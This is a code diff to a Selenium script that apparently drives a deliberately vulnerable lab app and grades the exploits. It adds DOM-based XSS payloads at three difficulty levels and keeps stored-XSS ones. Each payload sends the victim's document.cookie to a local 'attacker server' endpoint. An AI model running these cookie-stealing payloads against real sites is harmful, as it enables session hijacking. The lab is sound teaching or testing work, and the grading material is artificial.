@@ -10,11 +10,11 @@ ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'
 
 def xss(vuln_type, level):
     # TODO remove this if statement
-    if(vuln_type != '2'):
+    if(vuln_type != '3'):
         return
     if(level != 'low' and level != 'medium' and level != 'high'):
         return
-    print("SENDING REQUEST")
+
     options = Options()
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options) # Starts the browser
@@ -35,9 +35,7 @@ def xss(vuln_type, level):
         driver.get(url)
 
     # Stored XSS
-    print(level)
     if vuln_type == '2' and level == 'high':
-        # print("I AM HERE!!!!")
         url = 'http://localhost:1337/xss/2/high?comment=<svg onload=$.ajax({url:"http://localhost:1338/xss/stored_high?cookie=".concat(document.cookie)});></svg>'
         driver.get(url)
 
@@ -49,6 +47,18 @@ def xss(vuln_type, level):
         url = 'http://localhost:1337/xss/2/medium?comment=<body onload=$.ajax({url:"http://localhost:1338/xss/stored_medium?cookie=".concat(document.cookie)});></body>'
         driver.get(url)
         # pass
+
+    # DOM Elements
+    if vuln_type == '3' and level == 'low':
+        url = 'http://localhost:1337/xss/3/low?lang=%3Cscript%3E$.ajax({url:%22http://localhost:1338/xss/DOM_low?cookie=%22.concat(document.cookie)})%3C/script%3E'
+        driver.get(url)
+    elif vuln_type == '3' and level == 'medium':
+        url = 'http://localhost:1337/xss/3/medium?lang=%3Cbody%20onload=$.ajax({url:%22http://localhost:1338/xss/DOM_medium?cookie=%22.concat(document.cookie)});%3E%3C/body%3E'
+        driver.get(url)
+    elif vuln_type == '3' and level == 'high':
+        url = 'http://localhost:1337/xss/3/high?lang=%3Cbody%20onload=$.ajax({url:%22http://localhost:1338/xss/DOM_high?cookie=%22.concat(document.cookie)});%3E%3C/body%3E'
+        driver.get(url)
+
 
     # Grader verification should be done in attacker_server/server.py
 
